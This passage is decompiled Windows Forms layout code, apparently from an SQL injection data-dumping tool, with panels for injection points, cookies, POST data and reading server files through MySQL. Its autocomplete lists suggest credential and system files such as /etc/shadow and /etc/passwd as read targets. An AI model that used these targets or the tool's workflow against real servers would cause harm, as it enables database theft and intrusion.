		this.grbLoadFile.Size = new System.Drawing.Size(1383, 77);
		this.grbLoadFile.TabIndex = 15;
		this.grbLoadFile.TabStop = false;
		this.grbLoadFile.Text = "Read File";
		this.tsMySQLReadFile.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsMySQLReadFile.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.tsMySQLReadFile.Items.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.lblReadPath, this.txtMySQLReadFilePath, this.ToolStripSeparator4, this.cmbMySQLReadFile, this.ToolStripSeparator6, this.btnMySQLReadFile });
		this.tsMySQLReadFile.Location = new System.Drawing.Point(4, 24);
		this.tsMySQLReadFile.Name = "tsMySQLReadFile";
		this.tsMySQLReadFile.Padding = new System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsMySQLReadFile.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
		this.tsMySQLReadFile.ShowItemToolTips = false;
		this.tsMySQLReadFile.Size = new System.Drawing.Size(1375, 33);
		this.tsMySQLReadFile.TabIndex = 12;
		this.tsMySQLReadFile.Text = "ToolStrip1";
		this.lblReadPath.AutoSize = false;
		this.lblReadPath.Name = "lblReadPath";
		this.lblReadPath.Size = new System.Drawing.Size(50, 19);
		this.lblReadPath.Text = "Path:";
		this.lblReadPath.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.txtMySQLReadFilePath.AutoCompleteCustomSource.AddRange(new string[9] { "/home/www/HostName_com/html/index.php", "/etc/passwd", "/etc/shadow", "/etc/default/passwd", "/etc/passwd", "/etc/login.defs", "/etc/group", "/etc/apache2/apache2.conf", "c:\\\\boot.ini" });
		this.txtMySQLReadFilePath.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.Suggest;
		this.txtMySQLReadFilePath.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.CustomSource;
		this.txtMySQLReadFilePath.AutoSize = false;
		this.txtMySQLReadFilePath.Name = "txtMySQLReadFilePath";
		this.txtMySQLReadFilePath.Size = new System.Drawing.Size(298, 31);
		this.txtMySQLReadFilePath.Text = "/etc/passwd";
		this.ToolStripSeparator4.Name = "ToolStripSeparator4";
		this.ToolStripSeparator4.Size = new System.Drawing.Size(6, 33);
		this.cmbMySQLReadFile.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbMySQLReadFile.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.cmbMySQLReadFile.Name = "cmbMySQLReadFile";
		this.cmbMySQLReadFile.Size = new System.Drawing.Size(180, 33);
		this.ToolStripSeparator6.Name = "ToolStripSeparator6";
		this.ToolStripSeparator6.Size = new System.Drawing.Size(6, 33);
		this.btnMySQLReadFile.ForeColor = System.Drawing.SystemColors.ControlText;
		this.btnMySQLReadFile.Image = ns0.Class6.Run_16x_24;
		this.btnMySQLReadFile.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnMySQLReadFile.Name = "btnMySQLReadFile";
		this.btnMySQLReadFile.Size = new System.Drawing.Size(87, 30);
		this.btnMySQLReadFile.Text = "Read..";
		this.tpSearch.Controls.Add(this.txtSearchColumnResult);
		this.tpSearch.Controls.Add(this.tsSearchColumn);
		this.tpSearch.ImageIndex = 4;
		this.tpSearch.Location = new System.Drawing.Point(4, 29);
		this.tpSearch.Name = "tpSearch";
		this.tpSearch.Padding = new System.Windows.Forms.Padding(3);
		this.tpSearch.Size = new System.Drawing.Size(1391, 1253);
		this.tpSearch.TabIndex = 5;
		this.tpSearch.Text = "Search Column";
		this.tpSearch.UseVisualStyleBackColor = true;
		this.txtSearchColumnResult.BackColor = System.Drawing.SystemColors.Window;
		this.txtSearchColumnResult.Dock = System.Windows.Forms.DockStyle.Fill;
		this.txtSearchColumnResult.Font = new System.Drawing.Font("Courier New", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.txtSearchColumnResult.Location = new System.Drawing.Point(3, 36);
		this.txtSearchColumnResult.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.txtSearchColumnResult.MaxLength = 2048;
		this.txtSearchColumnResult.Multiline = true;
		this.txtSearchColumnResult.Name = "txtSearchColumnResult";
		this.txtSearchColumnResult.ReadOnly = true;
		this.txtSearchColumnResult.ScrollBars = System.Windows.Forms.ScrollBars.Both;
		this.txtSearchColumnResult.Size = new System.Drawing.Size(1385, 1214);
		this.txtSearchColumnResult.TabIndex = 121;
		this.txtSearchColumnResult.TabStop = false;
		this.txtSearchColumnResult.WordWrap = false;
		this.tsSearchColumn.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsSearchColumn.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.tsSearchColumn.Items.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.txtSearchColumn, this.ToolStripSeparator7, this.chkSearchColumnAllDBs, this.ToolStripSeparator8, this.btnSearchColumn });
		this.tsSearchColumn.Location = new System.Drawing.Point(3, 3);
		this.tsSearchColumn.Name = "tsSearchColumn";
		this.tsSearchColumn.Padding = new System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsSearchColumn.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
		this.tsSearchColumn.ShowItemToolTips = false;
		this.tsSearchColumn.Size = new System.Drawing.Size(1385, 33);
		this.tsSearchColumn.TabIndex = 12;
		this.tsSearchColumn.Text = "ToolStrip1";
		this.txtSearchColumn.AutoCompleteCustomSource.AddRange(new string[9] { "/home/www/HostName_com/html/index.php", "/etc/passwd", "/etc/shadow", "/etc/default/passwd", "/etc/passwd", "/etc/login.defs", "/etc/group", "/etc/apache2/apache2.conf", "c:\\\\boot.ini" });
		this.txtSearchColumn.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.Suggest;
		this.txtSearchColumn.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.CustomSource;
		this.txtSearchColumn.AutoSize = false;
		this.txtSearchColumn.Name = "txtSearchColumn";
		this.txtSearchColumn.Size = new System.Drawing.Size(298, 33);
		this.txtSearchColumn.Text = "mail";
		this.ToolStripSeparator7.Name = "ToolStripSeparator7";
		this.ToolStripSeparator7.Size = new System.Drawing.Size(6, 33);
		this.chkSearchColumnAllDBs.CheckOnClick = true;
		this.chkSearchColumnAllDBs.Image = ns0.Class6.DatabaseSchema_16x_24;
		this.chkSearchColumnAllDBs.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.chkSearchColumnAllDBs.Name = "chkSearchColumnAllDBs";
		this.chkSearchColumnAllDBs.Size = new System.Drawing.Size(146, 30);
		this.chkSearchColumnAllDBs.Text = "All DataBases";
		this.ToolStripSeparator8.Name = "ToolStripSeparator8";
		this.ToolStripSeparator8.Size = new System.Drawing.Size(6, 33);
		this.btnSearchColumn.ForeColor = System.Drawing.SystemColors.ControlText;
		this.btnSearchColumn.Image = ns0.Class6.Run_16x_24;
		this.btnSearchColumn.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnSearchColumn.Name = "btnSearchColumn";
		this.btnSearchColumn.Size = new System.Drawing.Size(84, 30);
		this.btnSearchColumn.Text = "Start..";
		this.tpProxies.ImageIndex = 3;
		this.tpProxies.Location = new System.Drawing.Point(4, 29);
		this.tpProxies.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.tpProxies.Name = "tpProxies";
		this.tpProxies.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.tpProxies.Size = new System.Drawing.Size(1391, 1253);
		this.tpProxies.TabIndex = 3;
		this.tpProxies.Text = "A.\b\u0013";
		this.tpProxies.UseVisualStyleBackColor = true;
		this.imlTabs.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imlTabs.ImageStream");
		this.imlTabs.TransparentColor = System.Drawing.Color.Fuchsia;
		this.imlTabs.Images.SetKeyName(0, "ServerAudit_16x_24.bmp");
		this.imlTabs.Images.SetKeyName(1, "SQLScript_16x_24.bmp");
		this.imlTabs.Images.SetKeyName(2, "TextFile_16x_24.bmp");
		this.imlTabs.Images.SetKeyName(3, "PublishAllWebsite_16x_24.bmp");
		this.imlTabs.Images.SetKeyName(4, "SearchContract_16x_24.bmp");
		this.numSleepMultiThread.ForeColor = System.Drawing.SystemColors.ControlText;
		this.numSleepMultiThread.Increment = new decimal(new int[4] { 50, 0, 0, 0 });
		this.numSleepMultiThread.Location = new System.Drawing.Point(208, 102);
		this.numSleepMultiThread.Maximum = new decimal(new int[4] { 20000, 0, 0, 0 });
		this.numSleepMultiThread.Name = "numSleepMultiThread";
		this.numSleepMultiThread.Size = new System.Drawing.Size(105, 26);
		this.numSleepMultiThread.TabIndex = 11;
		this.numSleepMultiThread.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
		this.numSleepMultiThread.Value = new decimal(new int[4] { 50, 0, 0, 0 });
		this.lblMultiThreadDelay.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblMultiThreadDelay.Location = new System.Drawing.Point(6, 105);
		this.lblMultiThreadDelay.Name = "lblMultiThreadDelay";
		this.lblMultiThreadDelay.Size = new System.Drawing.Size(195, 29);
		this.lblMultiThreadDelay.TabIndex = 4;
		this.lblMultiThreadDelay.Text = "Multi-Thread Delay  (ms)";
		this.lblMultiThreadDelay.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.lblMultiThreadRetry.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblMultiThreadRetry.Location = new System.Drawing.Point(6, 143);
		this.lblMultiThreadRetry.Name = "lblMultiThreadRetry";
		this.lblMultiThreadRetry.Size = new System.Drawing.Size(195, 29);
		this.lblMultiThreadRetry.TabIndex = 6;
		this.lblMultiThreadRetry.Text = "&Multi-Thread Retry Limit";
		this.lblMultiThreadRetry.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.numMaxRetryMultiThread.ForeColor = System.Drawing.SystemColors.ControlText;
		this.numMaxRetryMultiThread.Increment = new decimal(new int[4] { 5, 0, 0, 0 });
		this.numMaxRetryMultiThread.Location = new System.Drawing.Point(208, 137);
		this.numMaxRetryMultiThread.Maximum = new decimal(new int[4] { 1000, 0, 0, 0 });
		this.numMaxRetryMultiThread.Minimum = new decimal(new int[4] { 1, 0, 0, 0 });
		this.numMaxRetryMultiThread.Name = "numMaxRetryMultiThread";
		this.numMaxRetryMultiThread.Size = new System.Drawing.Size(105, 26);
		this.numMaxRetryMultiThread.TabIndex = 12;
		this.numMaxRetryMultiThread.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
		this.numMaxRetryMultiThread.Value = new decimal(new int[4] { 100, 0, 0, 0 });
		this.numSleep.ForeColor = System.Drawing.SystemColors.ControlText;
		this.numSleep.Increment = new decimal(new int[4] { 50, 0, 0, 0 });
		this.numSleep.Location = new System.Drawing.Point(208, 174);
		this.numSleep.Maximum = new decimal(new int[4] { 20000, 0, 0, 0 });
		this.numSleep.Name = "numSleep";
		this.numSleep.Size = new System.Drawing.Size(105, 26);
		this.numSleep.TabIndex = 11;
		this.numSleep.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
		this.numSleep.Value = new decimal(new int[4] { 200, 0, 0, 0 });
		this.lblThreadDelay.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblThreadDelay.Location = new System.Drawing.Point(6, 177);
		this.lblThreadDelay.Name = "lblThreadDelay";
		this.lblThreadDelay.Size = new System.Drawing.Size(195, 29);
		this.lblThreadDelay.TabIndex = 4;
		this.lblThreadDelay.Text = "Single-Thread Delay  (ms)";
		this.lblThreadDelay.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.lblThreadRetry.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblThreadRetry.Location = new System.Drawing.Point(6, 212);
		this.lblThreadRetry.Name = "lblThreadRetry";
		this.lblThreadRetry.Size = new System.Drawing.Size(195, 29);
		this.lblThreadRetry.TabIndex = 6;
		this.lblThreadRetry.Text = "Single-Thread Retry Limit";
		this.lblThreadRetry.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.numMaxRetry.ForeColor = System.Drawing.SystemColors.ControlText;
		this.numMaxRetry.Increment = new decimal(new int[4] { 5, 0, 0, 0 });
		this.numMaxRetry.Location = new System.Drawing.Point(208, 209);
		this.numMaxRetry.Maximum = new decimal(new int[4] { 1000, 0, 0, 0 });
		this.numMaxRetry.Minimum = new decimal(new int[4] { 1, 0, 0, 0 });
		this.numMaxRetry.Name = "numMaxRetry";
		this.numMaxRetry.Size = new System.Drawing.Size(105, 26);
		this.numMaxRetry.TabIndex = 12;
		this.numMaxRetry.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
		this.numMaxRetry.Value = new decimal(new int[4] { 5, 0, 0, 0 });
		this.pnlSetupDump.Controls.Add(this.pnlSetupDump2);
		this.pnlSetupDump.Dock = System.Windows.Forms.DockStyle.Right;
		this.pnlSetupDump.Location = new System.Drawing.Point(1399, 0);
		this.pnlSetupDump.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.pnlSetupDump.Name = "pnlSetupDump";
		this.pnlSetupDump.Size = new System.Drawing.Size(363, 1286);
		this.pnlSetupDump.TabIndex = 31;
		this.pnlSetupDump2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.pnlSetupDump2.AutoScroll = true;
		this.pnlSetupDump2.Controls.Add(this.tsNewDumpBtn);
		this.pnlSetupDump2.Controls.Add(this.grbInjectionPoint);
		this.pnlSetupDump2.Controls.Add(this.grbLogin);
		this.pnlSetupDump2.Controls.Add(this.grbDumpSetup2);
		this.pnlSetupDump2.Controls.Add(this.grbMySQLSplitRows);
		this.pnlSetupDump2.Controls.Add(this.grbDumpSetup);
		this.pnlSetupDump2.Controls.Add(this.grbOracleCollactions);
		this.pnlSetupDump2.Controls.Add(this.grbMSSQLCollactions);
		this.pnlSetupDump2.Controls.Add(this.grbMySQLCollactions);
		this.pnlSetupDump2.Controls.Add(this.grbSetupCon);
		this.pnlSetupDump2.Location = new System.Drawing.Point(9, 22);
		this.pnlSetupDump2.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.pnlSetupDump2.Name = "pnlSetupDump2";
		this.pnlSetupDump2.Size = new System.Drawing.Size(345, 1251);
		this.pnlSetupDump2.TabIndex = 45;
		this.tsNewDumpBtn.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsNewDumpBtn.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.tsNewDumpBtn.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.btnLoadDefautSettings, this.btnLoadNewDumper });
		this.tsNewDumpBtn.Location = new System.Drawing.Point(0, 1611);
		this.tsNewDumpBtn.Name = "tsNewDumpBtn";
		this.tsNewDumpBtn.Padding = new System.Windows.Forms.Padding(0, 0, 4, 0);
		this.tsNewDumpBtn.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
		this.tsNewDumpBtn.ShowItemToolTips = false;
		this.tsNewDumpBtn.Size = new System.Drawing.Size(319, 32);
		this.tsNewDumpBtn.Stretch = true;
		this.tsNewDumpBtn.TabIndex = 48;
		this.tsNewDumpBtn.Text = "ToolStrip2";
		this.btnLoadDefautSettings.Image = ns0.Class6.delete;
		this.btnLoadDefautSettings.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnLoadDefautSettings.Name = "btnLoadDefautSettings";
		this.btnLoadDefautSettings.Size = new System.Drawing.Size(126, 29);
		this.btnLoadDefautSettings.Text = "&Clear Form";
		this.btnLoadNewDumper.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.btnLoadNewDumper.Image = ns0.Class6.ConfirmButton_16x_24;
		this.btnLoadNewDumper.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnLoadNewDumper.Name = "btnLoadNewDumper";
		this.btnLoadNewDumper.Size = new System.Drawing.Size(145, 29);
		this.btnLoadNewDumper.Text = "&New Dumper";
		this.grbInjectionPoint.Controls.Add(this.lblHeaderValue);
		this.grbInjectionPoint.Controls.Add(this.txtAddHeaderValue);
		this.grbInjectionPoint.Controls.Add(this.lblHeaderName);
		this.grbInjectionPoint.Controls.Add(this.txtAddHeaderName);
		this.grbInjectionPoint.Controls.Add(this.lblInjectionPointMethod);
		this.grbInjectionPoint.Controls.Add(this.lblInjectionPoint);
		this.grbInjectionPoint.Controls.Add(this.cmbInjectionPoint);
		this.grbInjectionPoint.Controls.Add(this.cmbMethod);
		this.grbInjectionPoint.Controls.Add(this.txtCookies);
		this.grbInjectionPoint.Controls.Add(this.txtPost);
		this.grbInjectionPoint.Controls.Add(this.lblPost);
		this.grbInjectionPoint.Controls.Add(this.lblCookies);
		this.grbInjectionPoint.Controls.Add(this.chkAddHearder);
		this.grbInjectionPoint.Dock = System.Windows.Forms.DockStyle.Top;
		this.grbInjectionPoint.Location = new System.Drawing.Point(0, 1249);
		this.grbInjectionPoint.Name = "grbInjectionPoint";
		this.grbInjectionPoint.Size = new System.Drawing.Size(319, 362);
		this.grbInjectionPoint.TabIndex = 46;
		this.grbInjectionPoint.TabStop = false;
		this.grbInjectionPoint.Text = "&Injection Point:";
		this.lblHeaderValue.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblHeaderValue.Location = new System.Drawing.Point(15, 306);
		this.lblHeaderValue.Name = "lblHeaderValue";
		this.lblHeaderValue.Size = new System.Drawing.Size(80, 29);
		this.lblHeaderValue.TabIndex = 26;
		this.lblHeaderValue.Text = "&Value:";
		this.lblHeaderValue.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.txtAddHeaderValue.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.txtAddHeaderValue.Enabled = false;
		this.txtAddHeaderValue.ForeColor = System.Drawing.SystemColors.ControlText;
		this.txtAddHeaderValue.Location = new System.Drawing.Point(100, 308);
		this.txtAddHeaderValue.Name = "txtAddHeaderValue";
		this.txtAddHeaderValue.Size = new System.Drawing.Size(211, 26);
		this.txtAddHeaderValue.TabIndex = 25;
		this.lblHeaderName.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblHeaderName.Location = new System.Drawing.Point(15, 277);
		this.lblHeaderName.Name = "lblHeaderName";
		this.lblHeaderName.Size = new System.Drawing.Size(80, 29);
		this.lblHeaderName.TabIndex = 24;
		this.lblHeaderName.Text = "&Name:";
		this.lblHeaderName.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.txtAddHeaderName.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.txtAddHeaderName.Enabled = false;
		this.txtAddHeaderName.ForeColor = System.Drawing.SystemColors.ControlText;
		this.txtAddHeaderName.Location = new System.Drawing.Point(100, 272);
		this.txtAddHeaderName.Name = "txtAddHeaderName";
		this.txtAddHeaderName.Size = new System.Drawing.Size(211, 26);
		this.txtAddHeaderName.TabIndex = 23;
		this.lblInjectionPointMethod.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblInjectionPointMethod.Location = new System.Drawing.Point(14, 65);
		this.lblInjectionPointMethod.Name = "lblInjectionPointMethod";
		this.lblInjectionPointMethod.Size = new System.Drawing.Size(84, 29);
		this.lblInjectionPointMethod.TabIndex = 16;
		this.lblInjectionPointMethod.Text = "&Method";
		this.lblInjectionPointMethod.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.lblInjectionPoint.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblInjectionPoint.Location = new System.Drawing.Point(14, 29);
		this.lblInjectionPoint.Name = "lblInjectionPoint";
		this.lblInjectionPoint.Size = new System.Drawing.Size(84, 29);
		this.lblInjectionPoint.TabIndex = 15;
		this.lblInjectionPoint.Text = "&Injection Point:";
		this.lblInjectionPoint.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.cmbInjectionPoint.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.cmbInjectionPoint.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbInjectionPoint.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.cmbInjectionPoint.ForeColor = System.Drawing.SystemColors.ControlText;
		this.cmbInjectionPoint.FormattingEnabled = true;
		this.cmbInjectionPoint.Location = new System.Drawing.Point(100, 26);
		this.cmbInjectionPoint.Name = "cmbInjectionPoint";
		this.cmbInjectionPoint.Size = new System.Drawing.Size(211, 28);
		this.cmbInjectionPoint.TabIndex = 14;
		this.cmbMethod.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.cmbMethod.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbMethod.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.cmbMethod.FormattingEnabled = true;
		this.cmbMethod.Location = new System.Drawing.Point(100, 65);
		this.cmbMethod.Name = "cmbMethod";
		this.cmbMethod.Size = new System.Drawing.Size(211, 28);
		this.cmbMethod.TabIndex = 3;
		this.txtCookies.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.txtCookies.ForeColor = System.Drawing.SystemColors.ControlText;
		this.txtCookies.Location = new System.Drawing.Point(14, 132);
		this.txtCookies.Name = "txtCookies";
		this.txtCookies.Size = new System.Drawing.Size(297, 26);
		this.txtCookies.TabIndex = 3;
		this.txtPost.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.txtPost.Enabled = false;
		this.txtPost.ForeColor = System.Drawing.SystemColors.ControlText;
		this.txtPost.Location = new System.Drawing.Point(14, 202);
		this.txtPost.Name = "txtPost";
		this.txtPost.Size = new System.Drawing.Size(297, 26);
		this.txtPost.TabIndex = 4;
		this.lblPost.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblPost.Location = new System.Drawing.Point(14, 172);
		this.lblPost.Name = "lblPost";
		this.lblPost.Size = new System.Drawing.Size(146, 29);
		this.lblPost.TabIndex = 21;
		this.lblPost.Text = "&POST";
		this.lblPost.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.lblCookies.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblCookies.Location = new System.Drawing.Point(14, 103);
		this.lblCookies.Name = "lblCookies";
		this.lblCookies.Size = new System.Drawing.Size(146, 29);
		this.lblCookies.TabIndex = 19;
		this.lblCookies.Text = "Coo&kies";
		this.lblCookies.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.chkAddHearder.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.chkAddHearder.CheckAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkAddHearder.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.chkAddHearder.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkAddHearder.Location = new System.Drawing.Point(100, 248);
		this.chkAddHearder.Name = "chkAddHearder";
		this.chkAddHearder.Size = new System.Drawing.Size(213, 25);
		this.chkAddHearder.TabIndex = 27;
		this.chkAddHearder.Text = "&Add Header";
		this.chkAddHearder.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkAddHearder.UseVisualStyleBackColor = true;
		this.grbLogin.Controls.Add(this.txtUserName);
		this.grbLogin.Controls.Add(this.txtPassword);
		this.grbLogin.Controls.Add(this.lblLoginUser);
		this.grbLogin.Controls.Add(this.lblLoginPassword);
		this.grbLogin.Dock = System.Windows.Forms.DockStyle.Top;
		this.grbLogin.Location = new System.Drawing.Point(0, 1149);
		this.grbLogin.Name = "grbLogin";
		this.grbLogin.Size = new System.Drawing.Size(319, 100);
		this.grbLogin.TabIndex = 45;
		this.grbLogin.TabStop = false;
		this.grbLogin.Text = "Network Credential (&Login)";
		this.txtUserName.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.txtUserName.ForeColor = System.Drawing.SystemColors.ControlText;
		this.txtUserName.Location = new System.Drawing.Point(100, 25);
		this.txtUserName.Name = "txtUserName";
		this.txtUserName.Size = new System.Drawing.Size(211, 26);
		this.txtUserName.TabIndex = 16;
		this.txtPassword.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.txtPassword.ForeColor = System.Drawing.SystemColors.ControlText;
		this.txtPassword.Location = new System.Drawing.Point(100, 60);
		this.txtPassword.Name = "txtPassword";
		this.txtPassword.Size = new System.Drawing.Size(211, 26);
		this.txtPassword.TabIndex = 17;
		this.lblLoginUser.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblLoginUser.Location = new System.Drawing.Point(9, 26);
		this.lblLoginUser.Name = "lblLoginUser";
		this.lblLoginUser.Size = new System.Drawing.Size(88, 29);
		this.lblLoginUser.TabIndex = 3;
		this.lblLoginUser.Text = "UserName";
		this.lblLoginUser.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.lblLoginPassword.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblLoginPassword.Location = new System.Drawing.Point(9, 58);
		this.lblLoginPassword.Name = "lblLoginPassword";
		this.lblLoginPassword.Size = new System.Drawing.Size(88, 29);
		this.lblLoginPassword.TabIndex = 27;
		this.lblLoginPassword.Text = "Password";
		this.lblLoginPassword.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.grbDumpSetup2.Controls.Add(this.chkReDumpFailed);
		this.grbDumpSetup2.Controls.Add(this.chkClearListOnGet);
		this.grbDumpSetup2.Controls.Add(this.chkDumpOrderBy);
		this.grbDumpSetup2.Controls.Add(this.chkDumpWhere);
		this.grbDumpSetup2.Dock = System.Windows.Forms.DockStyle.Top;
		this.grbDumpSetup2.Location = new System.Drawing.Point(0, 1003);
		this.grbDumpSetup2.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbDumpSetup2.Name = "grbDumpSetup2";
		this.grbDumpSetup2.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbDumpSetup2.Size = new System.Drawing.Size(319, 146);
		this.grbDumpSetup2.TabIndex = 44;
		this.grbDumpSetup2.TabStop = false;
		this.chkReDumpFailed.CheckAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkReDumpFailed.Checked = true;
		this.chkReDumpFailed.CheckState = System.Windows.Forms.CheckState.Checked;
		this.chkReDumpFailed.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkReDumpFailed.Location = new System.Drawing.Point(10, 17);
		this.chkReDumpFailed.Name = "chkReDumpFailed";
		this.chkReDumpFailed.Size = new System.Drawing.Size(300, 25);
		this.chkReDumpFailed.TabIndex = 20;
		this.chkReDumpFailed.Text = "&ReDump Failed Index";
		this.chkReDumpFailed.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkReDumpFailed.UseVisualStyleBackColor = true;
		this.chkClearListOnGet.CheckAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkClearListOnGet.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.chkClearListOnGet.Location = new System.Drawing.Point(10, 111);
		this.chkClearListOnGet.Name = "chkClearListOnGet";
		this.chkClearListOnGet.Size = new System.Drawing.Size(300, 25);
		this.chkClearListOnGet.TabIndex = 1;
		this.chkClearListOnGet.Text = "Clear Schema On Get";
		this.chkClearListOnGet.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkClearListOnGet.UseVisualStyleBackColor = true;
		this.chkDumpOrderBy.CheckAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpOrderBy.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.chkDumpOrderBy.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkDumpOrderBy.Location = new System.Drawing.Point(10, 77);
		this.chkDumpOrderBy.Name = "chkDumpOrderBy";
		this.chkDumpOrderBy.Size = new System.Drawing.Size(300, 25);
		this.chkDumpOrderBy.TabIndex = 19;
		this.chkDumpOrderBy.Text = "&Add Query ORDER BY";
		this.chkDumpOrderBy.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpOrderBy.UseVisualStyleBackColor = true;
		this.chkDumpWhere.CheckAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpWhere.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.chkDumpWhere.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkDumpWhere.Location = new System.Drawing.Point(10, 49);
		this.chkDumpWhere.Name = "chkDumpWhere";
		this.chkDumpWhere.Size = new System.Drawing.Size(300, 25);
		this.chkDumpWhere.TabIndex = 18;
		this.chkDumpWhere.Text = "&Add Query WHERE";
		this.chkDumpWhere.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkDumpWhere.UseVisualStyleBackColor = true;
		this.grbMySQLSplitRows.Controls.Add(this.numMySQLSplitRowsLenght);
		this.grbMySQLSplitRows.Controls.Add(this.Label1);
		this.grbMySQLSplitRows.Controls.Add(this.chkMySQLSplitRows);
		this.grbMySQLSplitRows.Controls.Add(this.numMySQLSplitRows);
		this.grbMySQLSplitRows.Dock = System.Windows.Forms.DockStyle.Top;
		this.grbMySQLSplitRows.Location = new System.Drawing.Point(0, 894);
		this.grbMySQLSplitRows.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
